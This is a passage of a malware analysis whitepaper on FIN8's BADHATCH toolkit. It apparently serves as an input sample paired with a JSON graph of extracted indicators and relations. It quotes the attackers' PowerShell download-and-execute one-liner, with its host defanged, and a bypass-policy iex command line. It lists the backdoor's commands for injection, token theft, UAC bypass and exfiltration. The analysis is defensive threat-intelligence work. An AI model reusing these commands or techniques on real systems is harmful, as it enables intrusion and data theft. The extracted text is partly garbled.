@@ -1,0 +1,149 @@
+
+
+
+Sentence : Contents
+Recommendations............................................................................................................................................. 13
+IOCs . ................................................................................................................................................................... 14
+$pa=’sys’;iex (New-Object System.Net.WebClient).
+DownloadString(‘https://192-129-189-73[.]sslip[.]io/
+yo’)”. It abuses sslip.io - a service that provides free IP
+to domain mapping to make SSL certificate generation
+easier (for traffic encryption). While the service is
+legitimate and widely used, the malware abuses it in an
+attempt at evading detection.
+The malware deployment is started by the malicious
+PowerShell command line that downloads the
+script from ‘https://192-129-189-73[.]sslip[.]
+io/yo’ and executes it. T he script (which at
+one point in the investigati on was identified as
+c328b3714df8400f4d4c071edb1f6d3b82d42
+488ebf8d9437c300bec9108755b) uses two variables,
+$snoob and $cliks, that are assigned to the base64
+3
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+representations of shellcode for the x86 and x64 architectures, respectively. To execute the shellcode, a .NET binary
+is used (eg. 3b185ff12a5fface0148adaf07037d7d17f8a0d49b64cf802f72be1970ac4241) that loads it in memory and
+runs it in a new thread.
+The shellcode contains the BADHATCH DLL compressed with the ApLib algorithm.
+Once loaded, the embedded DLL obtains the value of the Y1US environment variable and extracts the string that
+contains options for behavior customization. A list of possible values observed in samples found is presented below:
+|Y1US value patterns|Remark|
+|---|---|
+|proxy::|~~Uses the given socks5 proxy to connect to C&C server~~|
+|sv|Injects itself into a new “svchost.exe –k netsvcs” process using APC|
+|sys|~~Impersonates lsass.exe/vmtoolsd.exe token, then follows the same steps~~as in the case of sv option|
+|ex|~~Injects itself into existing explorer.exe process by using~~RtlCreateUserThread|
+|inj:|Injects itself into the process thePID of which is indicated|
+Y1US patterns
+The mentioned environment variable is set by the deployment script as follows: $env:Y1US=$pa. The $pa variable is
+provided in the command line of the PowerShell process, “sys” being the only value we observed to be used by the
+attackers.
+We should mention that many indicators remain unchanged since the release of the GIGAMON report, like the event
+object named Local\{45292C4F-AABA-49ae-9D2E-EAF338F50DF4} that is used to ensure that only one running
+instance of malware exists and the asynchronous TLS-wrapped channel that intercepts TCP connections to the C&C
+and encrypts the traffic. The TLS wrapper is implemented using the Windows IO Completion PORT APIs and internally,
+it uses the already reported CompletionKeys “ nScS ” and “ rScs ”. The port that is opened and bound on localhost,
+however, may not always be 3885 as previously reported – it is increased if the current value is already used, the
+upper bound being the value of 4005.
+The BADHATCH banner went through several changes and the malware shows a version that looks like the one below:
+Badhatch shell banner (the line with proxy parameters is present only if the Y1US variable contains such option)
+The shell has two operating modes. Depending on the instruction received from the C&C, it can use either the CMD or
+POWERSHELL mode. After the mode type is received, the shell launches a process of either cmd.exe or powershell.exe
+that is used to execute commands. Besides the normal commands each process can execute, the BADHATCH shell
+implements many custom ones.
+4
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+In the POWERSHELL mode, powershell.exe is launched with the following command line - %systemroot%\
+system32\WindowsPowerShell\v1.0\powershell.exe -nop -noni -ep bypass -c iex($env:c) and the environment
+variable “c” is set with a piece of PowerShell code that reads commands from a pipe and executes it using the IEX .
+Interestingly, we noticed that the first command written to that pipe is a PowerShell script that loads six custom
+commands – info, Ping-Comp, Check-Port, Check-Share, psx and GetComputerInfo . More information on supported
+commands in the POWERSHELL mode is presented in the table:
+|Command|Remark|
+|---|---|
+|info|Obtains the current system information such asSHELL PID (pid of powershell.exe),PSVERSION, HOSTNAME, USER, LOGONSERVER, LASTBOOTUP, DATETIME, UPTIME aswell as integrity level of current process|
+|Ping-Comp |Uses a PowerShell object of typeSystem.Net.NetworkInformation.Ping to ping acomputer|
+|Check-Port  |~~ Check if the indicated port of a target computer is open by establishing a TCP~~connection|
+|Check-Share |Checks if the user can access the $C share on the target computer|
+|psx |Lists theprocesses running on the target computer|
+|GetComputerInfo |~~ Obtains information like disk information, OS type, logged users, system information for~~a remote computer using WMI|
+|terminate|Terminates the shell|
+|sleep |Sleeps for a given number of minutes|
+|remote |~~Executes the info command on the remote computer (it uses a remote pipe named~~psh444) – it is unclear how the process on the remote computer that would read fromthat pipe is started|
+|inject |Injects the BADHATCH into the process with the given PID|
+|psm|~~Receives a PowerShell module from the C&C server and sends it through the pipe to the~~PowerShell process to be executed (there is a size limit of 10 MB)|
+|mem|Receives a DLL and loads it in the current process|
+|cve|Receives a DLL and loads it in the spawned cmd.exe/powershell.exe process|
+|host|Sends OS version and hostname to the C&C server|
+|id|Sends CLIENT_ID to the C&C server|
+|pid|Sends the PID and process name of current process|
+|upload |Uploads the given fle to the C&C sever|
+|uac |Executes anUAC bypass using CMSTPLUA COM interface|
+|download |Receives content from the C&C server and saves it to the indicated fle|
+|whoami|Executes whoami.exe|
+|scr|Takes a screenshot and sends it to the C&C server|
+v2.14 psh shell supported commands
+In the CMD mode, the shell uses a process of cmd.exe and implements a different set of commands (including the
+following commands that behave like in the PowerShell mode: terminate, sleep, inject, mem, cve, whoami, host, id,
+pid, scr, upload and download):
+|Command|Remark|
+|---|---|
+|spawn |~~Impersonates the token of process with the given PID and injects the~~BADHATCH into a new svchost.exe|
+|proxy local |Binds to 0.0.0.0: and acts like a socks4, socks5 and http proxy|
+5
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+|Command|Remark|
+|---|---|
+|proxy bc|Acts like a reverse proxy; Connects to C&C, receive the destination IP andport as well as the traffc to push to the destination|
+|proxy status|Print info for the active connections on LOCAL and BC|
+|ftp |~~Acts like an ftp server; Connects to C&C and receives ftp commands; it~~can also interact with SMB shares (receives paths with “smb\” prefx thatis replaced with “\”)|
+|spid|Sends the PID of spawned cmd.exe|
+|steal|~~Impersonates the token of the process with the given PID and creates a~~new cmd.exe process that is used for command execution|
+|revert|Terminates the cmd.exe process created by the “steal” command|
+|ex|~~Sends the PID of explorer.exe and the corresponding domain user to the~~C&C server|
+|eventlog |~~Manipulates the main-thread state of the process responsible for~~EventLog Service|
+v2.14 cmd.exe shell supported commands (unique to CMD mode)
+6
+Bitdefender Whitepaper
+FIN8 Returns with Improved BADHATCH Toolkit
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "PowerShell command line", "type" : "EXEF"},
+        {"id": 2, "description": "https://192-129-189-73[.]sslip[.]io/yo", "type" : "URLS"},
+        {"id": 3, "description": "c328b3714df8400f4d4c071edb1f6d3b82d42488ebf8d9437c300bec9108755b", "type" : "IOCS"},
+        {"id": 4, "description": ".NET binary (3b185ff12a5fface0148adaf07037d7d17f8a0d49b64cf802f72be1970ac4241)", "type" : "EXEF"},
+        {"id": 5, "description": "BADHATCH DLL", "type" : "EXEF"},
+        {"id": 6, "description": "Y1US environment variable", "type" : "REGI"},
+        {"id": 7, "description": "svchost.exe –k netsvcs process", "type" : "EXEF"},
+        {"id": 8, "description": "explorer.exe process", "type" : "EXEF"},
+        {"id": 9, "description": "Local\\{45292C4F-AABA-49ae-9D2E-EAF338F50DF4} event object", "type" : "TAMP"},
+        {"id": 10, "description": "TCP connections to the C&C", "type" : "NETP"},
+        {"id": 11, "description": "3885 port (localhost)", "type" : "NETP"},
+        {"id": 12, "description": "4005 port (upper bound)", "type" : "NETP"},
+        {"id": 13, "description": "cmd.exe process", "type" : "EXEF"},
+        {"id": 14, "description": "powershell.exe process", "type" : "EXEF"},
+        {"id": 15, "description": "%systemroot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -noni -ep bypass -c iex($env:c)", "type" : "EXEF"},
+        {"id": 16, "description": "C&C server", "type" : "CCSH"},
+        {"id": 17, "description": "psh444 remote pipe", "type" : "TAMP"},
+        {"id": 18, "description": "0.0.0.0: port (proxy binding)", "type" : "NETP"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "downloads from"},
+        {"source": 2, "target": 3, "rel_name" : "hosts script with hash"},
+        {"source": 3, "target": 4, "rel_name" : "uses to execute shellcode"},
+        {"source": 4, "target": 5, "rel_name" : "loads and executes"},
+        {"source": 6, "target": 7, "rel_name" : "sets behavior for injecting into"},
+        {"source": 6, "target": 8, "rel_name" : "sets behavior for injecting into"},
+        {"source": 9, "target": 5, "rel_name" : "ensures single instance of"},
+        {"source": 10, "target": 16, "rel_name" : "communicates with"},
+        {"source": 11, "target": 12, "rel_name" : "range for binding on localhost"},
+        {"source": 13, "target": 14, "rel_name" : "used in different shell modes"},
+        {"source": 14, "target": 15, "rel_name" : "launched with command line"},
+        {"source": 16, "target": 17, "rel_name" : "communicates through remote pipe"},
+        {"source": 18, "target": 10, "rel_name" : "binds to for proxy"}
+    ]
+}
